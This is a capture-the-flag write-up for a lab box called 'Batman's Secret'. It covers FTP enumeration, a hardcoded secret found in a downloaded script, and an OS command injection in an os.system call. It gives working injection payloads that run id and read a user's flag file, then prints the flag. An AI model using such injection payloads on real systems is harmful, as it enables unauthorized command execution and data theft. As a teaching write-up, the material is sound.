# Batman's Secret — Write-up

## 1. Reconnaissance

Service enumeration:

```bash
nmap -sV -sC 10.10.0.28
```

Results:

```bash
21/tcp   FTP   vsftpd 3.0.5
22/tcp   SSH   OpenSSH
3000/tcp custom "Gotham Hotline" service
```

Nmap also revealed that anonymous FTP login was enabled.

## 2. FTP Enumeration

Connection:

```bash
ftp 10.10.0.28
```

Credentials:

```bash
Username: anonymous
Password: empty
```

Files found:

```bash
alert.py
logs/
└── report.txt
```

The `logs` directory and `report.txt` had very permissive permissions.

The Python script was downloaded:

```bash
get alert.py
```

Then analyzed locally:

```bash
cat alert.py
```

## 3. Source Code Analysis

The script revealed the authentication secret:

```bash
G0th4mN33dsTh3B4t!
```

More importantly, it contained the following vulnerable code:

```python
os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
```

The `alert_text` variable comes directly from user input and is inserted into a shell command without sanitization.

### Vulnerability

**OS Command Injection**

An attacker can break out of the intended command and execute arbitrary shell commands.

## 4. Command Injection Validation

Connection to the custom service:

```bash
nc 10.10.0.28 3000

Authentication: G0th4mN33dsTh3B4t!
```

Payload:

```bash
test'; id > /opt/hotline/logs/report.txt; #
```

The result was recovered through FTP:

```bash
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
```

This confirmed that the vulnerable service was running as:

```bash
bruce
```

## 5. Retrieving user.txt

The same vulnerability was used to read the flag:

```bash
test'; cat /home/bruce/user.txt > /opt/hotline/logs/report.txt; #
```

The resulting file was retrieved through FTP:

```bash
cd logs
get report.txt
cat report.txt
EPI{1s_8ruc3_W4yn3_84tm4n?}
```

## Methodology

```bash
Reconnaissance
      ↓
Service Enumeration
      ↓
Anonymous FTP Access
      ↓
File Enumeration
      ↓
Source Code Analysis
      ↓
Command Injection Discovery
      ↓
Command Execution Validation
      ↓
Identification of user "bruce"
      ↓
Retrieval of user.txt
```

## Vulnerabilities Identified

1. Anonymous FTP access enabled.
2. Sensitive source code exposed through FTP.
3. Hardcoded authentication secret.
4. Excessive permissions on the logs directory.
5. Unsanitized user input passed to `os.system()`.
6. OS command injection allowing arbitrary command execution as `bruce`.
